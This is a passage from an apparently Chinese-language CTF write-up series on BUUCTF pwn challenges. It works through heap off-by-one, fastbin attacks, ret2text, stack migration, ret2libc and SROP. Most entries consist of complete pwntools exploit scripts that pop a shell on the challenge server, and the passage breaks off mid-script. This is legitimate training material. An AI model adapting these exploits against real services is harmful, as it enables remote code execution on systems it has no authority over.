<p>考虑利用off by one的漏洞改大一个chunk的size送入unsorted bin后分割造成overlapping，同时 libc 基址可以通过栈上残留指针泄露</p>
<p>题目中的 heaparray 中如下结构体管理每个 chunk：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_HEAP_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">void</span> * chunk;</span><br><span class="line">&#125;heap;</span><br></pre></td></tr></table></figure>

<p>而每次为用户分配 chunk 之前都会用 malloc 先分配一个这样的结构体，那么我们可以通过overlapping直接改某个 chunk 指针为 <code>__free_hook</code> 一套带走</p>
<p>最终的 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25096</span>) <span class="comment">#process(&#x27;./heapcreator&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>) <span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span> , content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap : &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span> + p8(<span class="number">0xf1</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x40</span>,<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    dump(<span class="number">1</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0xdeadbeef</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">2</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/05/oe3m9PQUJcgnFHD.png" alt="image.png"></p>
<h2 id="0x03F-wustctf2020-getshell-2-ret2text"><a href="#0x03F-wustctf2020-getshell-2-ret2text" class="headerlink" title="0x03F.wustctf2020_getshell_2 - ret2text"></a>0x03F.wustctf2020_getshell_2 - ret2text</h2><p>惯例的 <code>checksec</code> ，只开了 NX</p>
<p><img src="https://i.loli.net/2021/04/05/qDjlmPpt5GXdFLZ.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>存在一个溢出</p>
<p><img src="https://i.loli.net/2021/04/05/esRV9TKSXuCgdlq.png" alt="image.png"></p>
<p>存在 system 函数和 <code>sh</code> 字符串</p>
<p><img src="https://i.loli.net/2021/04/05/WQNUs5r8xoEOISq.png" alt="image.png"></p>
<p>直接 ret2text 即可</p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25491</span>) <span class="comment">#process(&#x27;./wustctf2020_getshell_2&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./wustctf2020_getshell_2&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x8048529</span>) + p32(e.search(<span class="string">b&#x27;sh\x00&#x27;</span>).__next__()) * <span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/05/uPAWRDyvd6zosp2.png" alt="image.png"></p>
<h2 id="0x040-ciscn-2019-s-4-ret2text-stack-migration"><a href="#0x040-ciscn-2019-s-4-ret2text-stack-migration" class="headerlink" title="0x040.ciscn_2019_s_4 - ret2text + stack migration"></a>0x040.ciscn_2019_s_4 - ret2text + stack migration</h2><p>惯例的 <code>checksec</code> ，只开了NX</p>
<p><img src="https://i.loli.net/2021/04/05/7zHIhiaFC1Bf94E.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>有个 8 字节溢出，但是能读两次，第一次有输出，可以泄露 ebp</p>
<p><img src="https://i.loli.net/2021/04/05/uSZD8hLIzOHdy2A.png" alt="image.png"></p>
<p>有 system 函数</p>
<p><img src="https://i.loli.net/2021/04/05/LXAvar6inG3B4Vm.png" alt="image.png"></p>
<p>泄露栈上地址后栈迁移即可</p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26288</span>) <span class="comment">#process(&#x27;./ciscn_s_4&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_s_4&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line">call_sys = <span class="number">0x8048559</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A&#x27;</span> * offset)</span><br><span class="line">ebp_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&#x27;ebp leak: &#x27;</span> + <span class="built_in">hex</span>(ebp_leak))</span><br><span class="line">buf_addr = ebp_leak - <span class="number">0x38</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(p32(call_sys) * <span class="number">2</span> + p32(buf_addr + offset - <span class="number">4</span>) * <span class="number">7</span> + <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(buf_addr) + p32(<span class="number">0x8048562</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/05/SarVoEfIJXCgP2A.png" alt="image.png"></p>
<blockquote>
<p>笔者一开始一直当64位来想，还在思考“就溢出8个字节怎么控制返回地址”…</p>
<p>以及第二页终于完结了，可喜可贺可喜可贺.jpg</p>
</blockquote>
<h1 id="0x041-0x050"><a href="#0x041-0x050" class="headerlink" title="0x041 ~ 0x050"></a>0x041 ~ 0x050</h1><h2 id="0x041-mrctf2020-easyoverflow-overflow"><a href="#0x041-mrctf2020-easyoverflow-overflow" class="headerlink" title="0x041.mrctf2020_easyoverflow - overflow"></a>0x041.mrctf2020_easyoverflow - overflow</h2><p>惯例的 <code>checksec</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/04/06/nPdZeFxt6Cq1S9L.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>有溢出，字符串比较通过即可拿shell</p>
<p><img src="https://i.loli.net/2021/04/06/QJ72tAFYDM9kdaO.png" alt="image.png"></p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29407</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + <span class="string">b&quot;n0t_r3@11y_f1@g&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/06/aYCuzZgHB6xTpyA.png" alt="image.png"></p>
<h2 id="0x042-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#0x042-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="0x042.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget"></a>0x042.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget</h2><p>出现重复的题是真的离谱</p>
<p>过程见前面0x011，这里就不再赘叙了</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27143</span>)<span class="comment">#process(&#x27;./babyheap_0ctf_2017&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index:<span class="built_in">int</span>,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/10/19/kJSyCIWmsLdoaOD.png" alt="image.png"></p>
<h2 id="0x043-wustctf2020-closed-Linux基础知识"><a href="#0x043-wustctf2020-closed-Linux基础知识" class="headerlink" title="0x043.wustctf2020_closed - Linux基础知识"></a>0x043.wustctf2020_closed - Linux基础知识</h2><p>惯例的 <code>checksec</code> ，只开了 NX</p>
<p><img src="https://i.loli.net/2021/04/06/vx5cUdqXPCj6NZS.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>直接给 shell，但是关了 stdout 和 stderr</p>
<p><img src="https://i.loli.net/2021/04/06/2uzkPFVlrtob9MO.png" alt="image.png"></p>
<p>用 <code>1&gt;&amp;0</code> 即可拿到输出</p>
<p><img src="https://i.loli.net/2021/04/06/S6efsWGY9mcKZhL.png" alt="image.png"></p>
<h2 id="0x044-ciscn-2019-es-7-ret2libc-SROP"><a href="#0x044-ciscn-2019-es-7-ret2libc-SROP" class="headerlink" title="0x044.ciscn_2019_es_7 - ret2libc | SROP"></a>0x044.ciscn_2019_es_7 - ret2libc | SROP</h2><p>惯例的 <code>checksec</code> ，只开了 NX</p>
<p><img src="https://i.loli.net/2021/04/06/zhqX5PnrtVT9AHp.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>直接就有一个很大的溢出</p>
<p><img src="https://i.loli.net/2021/04/06/rqQVaZCRAn5feOW.png" alt="image.png"></p>
<p>我们可以考虑设置返回到 vuln开头() 进行多次读</p>
<p>需要注意的一点是vuln()函数以ebp作为返回值</p>
<p><img src="https://i.loli.net/2021/04/06/3A8dfRBr2KTOk7o.png" alt="image.png"></p>
<h3 id="解法一：ret2libc"><a href="#解法一：ret2libc" class="headerlink" title="解法一：ret2libc"></a>解法一：ret2libc</h3><p>我们可以通过多次返回到 vuln() 开头特定偏移处，将栈一步步拉近到 main 的返回地址附近，通过打印功能打印出 main 的返回地址，泄露 libc 基址，之后就是 ret2libc 一套带走</p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26477</span>)<span class="comment">#process(&#x27;./ciscn_2019_es_7&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>) <span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_es_7&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">ret = e.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line">leave_ret = e.search(asm(<span class="string">&#x27;leave ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0x4004F1</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;B&#x27;</span> * offset + p64(<span class="number">0x4004F1</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;C&#x27;</span> * offset + p64(<span class="number">0x4004F1</span>))</span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;libc addr leak: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc_base = (libc_leak - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset + p64(ret) + p64(pop_rdi_ret) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/06/zwuEUijrNJvpPhF.png" alt="image.png"></p>
<h3 id="解法二：SROP"><a href="#解法二：SROP" class="headerlink" title="解法二：SROP"></a>解法二：SROP</h3><p>观察到程序中存在如下 gadget：</p>
<p><img src="https://i.loli.net/2021/04/06/fpWZlRjIcLrDTN8.png" alt="image.png"></p>
<p>可以考虑第一次输入时泄露栈上地址，第二次输入通过 SROP 拿 shell</p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29375</span>)<span class="comment">#process(&#x27;./ciscn_2019_es_7&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>) <span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_es_7&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">ret = e.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line">leave_ret = e.search(asm(<span class="string">&#x27;leave ; ret&#x27;</span>)).__next__()</span><br><span class="line">mov_rax_15 = e.search(asm(<span class="string">&#x27;mov rax , 0xf ; ret&#x27;</span>)).__next__()</span><br><span class="line">syscall_addr = e.search(asm(<span class="string">&#x27;syscall&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset + p64(e.sym[<span class="string">&#x27;vuln&#x27;</span>]))</span><br><span class="line">stack_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;stack leak: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">buf_addr = stack_leak - <span class="number">0x118</span></span><br><span class="line">log.success(<span class="string">&#x27;buf addr now: &#x27;</span> + <span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span> <span class="comment"># syscall::execve, constants.SYS_execve is also ok</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">frame.rdi = buf_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span 